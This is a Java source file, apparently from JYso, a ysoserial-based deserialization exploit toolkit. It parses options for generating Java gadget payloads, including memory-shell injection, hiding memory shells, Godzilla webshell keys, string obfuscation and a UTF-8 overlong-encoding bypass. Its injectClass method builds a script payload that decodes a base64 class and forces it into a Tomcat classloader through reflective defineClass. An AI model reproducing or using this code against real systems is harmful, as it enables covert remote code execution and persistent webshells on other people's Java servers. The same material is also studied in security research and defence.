package com.qi4l.JYso.gadgets.utils;

import com.qi4l.JYso.gadgets.Config.Config;
import javassist.*;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import static com.qi4l.JYso.controllers.ysoserial.getOptions;
import static com.qi4l.JYso.gadgets.Config.Config.POOL;
import static com.qi4l.JYso.gadgets.utils.HexUtils.generatePassword;

public class InjShell {

    public static CommandLine cmdLine;

    // 恶心一下人，实际没用
    public static String converString(String target) {
        if (Config.IS_OBSCURE) {
            StringBuilder result = new StringBuilder("new String(new byte[]{");
            byte[] bytes = target.getBytes();
            for (int i = 0; i < bytes.length; i++) {
                result.append(bytes[i]).append(",");
            }
            return result.substring(0, result.length() - 1) + "})";
        }

        return "\"" + target + "\"";
    }

    public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
        ctClass.defrost();
        try {
            CtField ctSUID = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(ctSUID);
        } catch (javassist.NotFoundException ignored) {
        }
        ctClass.addField(CtField.make(fieldCode, ctClass));
    }

    public static CtClass insertField(String fieldName, String fieldCode) throws Exception {
        POOL.insertClassPath(new ClassClassPath(Class.forName(fieldName)));
        final CtClass ctClass = POOL.get(fieldName);
        try {
            insertField(ctClass, fieldName, fieldCode);
            return ctClass;
        } catch (javassist.bytecode.DuplicateMemberException ignored) {
            return ctClass;
        }
    }

    //类加载方式，因类而异
    public static String injectClass(Class clazz) {

        String classCode = null;
        try {
            //获取base64后的类
            classCode = Utils.getClassCode(clazz);

        } catch (Exception e) {
            e.printStackTrace();
        }

        return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "try{\n" +
                "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                "   clazz.newInstance();\n" +
                "}catch(err){\n" +
                "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "   method.setAccessible(true);\n" +
                "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "   clazz.newInstance();\n" +
                "};";
    }

    public static void init(String[] args) throws Exception {
        final Options options = getOptions();

        CommandLineParser parser = new DefaultParser();

        try {
            cmdLine = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("[*] Parameter input error, please use -h for more information");
            System.exit(1);
        }

        if (cmdLine.hasOption("inherit")) {
            Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
        }

        if (cmdLine.hasOption("obscure")) {
            Config.IS_OBSCURE = true;
        }

        if (cmdLine.hasOption("cmd-header")) {
            Config.CMD_HEADER_STRING = cmdLine.getOptionValue("cmd-header");
        }

        if (cmdLine.hasOption("url")) {
            String url = cmdLine.getOptionValue("url");
            if (!url.startsWith("/")) {
                url = "/" + url;
            }
            Config.URL_PATTERN = url;
        }

        if (cmdLine.hasOption("define-class-from-parameter")) {
            Config.PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
        }

        if (cmdLine.hasOption("file")) {
            Config.WRITE_FILE = true;
            Config.FILE = cmdLine.getOptionValue("file");
        }

        if (cmdLine.hasOption("password")) {
            Config.PASSWORD_ORI = cmdLine.getOptionValue("password");
            Config.PASSWORD = generatePassword(Config.PASSWORD_ORI);
        }

        if (cmdLine.hasOption("godzilla-key")) {
            Config.GODZILLA_KEY = generatePassword(cmdLine.getOptionValue("godzilla-key"));
        }

        if (cmdLine.hasOption("header-key")) {
            Config.HEADER_KEY = cmdLine.getOptionValue("header-key");
        }

        if (cmdLine.hasOption("header-value")) {
            Config.HEADER_VALUE = cmdLine.getOptionValue("header-value");
        }

        if (cmdLine.hasOption("no-com-sun")) {
            Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL = true;
        }

        if (cmdLine.hasOption("mozilla-class-loader")) {
            Config.USING_MOZILLA_DEFININGCLASSLOADER = true;
        }

        if (cmdLine.hasOption("rhino")) {
            Config.USING_RHINO = true;
        }

        if (cmdLine.hasOption("utf8-Overlong-Encoding")) {
            Config.IS_UTF_Bypass = true;
        }

        if (cmdLine.hasOption("gen-mem-shell")) {
            Config.GEN_MEM_SHELL = true;

            if (cmdLine.hasOption("gen-mem-shell-name")) {
                Config.GEN_MEM_SHELL_FILENAME = cmdLine.getOptionValue("gen-mem-shell-name");
            }
        }

        if (cmdLine.hasOption("hide-mem-shell")) {
            Config.HIDE_MEMORY_SHELL = true;

            if (cmdLine.hasOption("hide-type")) {
                Config.HIDE_MEMORY_SHELL_TYPE = Integer.parseInt(cmdLine.getOptionValue("hide-type"));
            }
        }

    }
}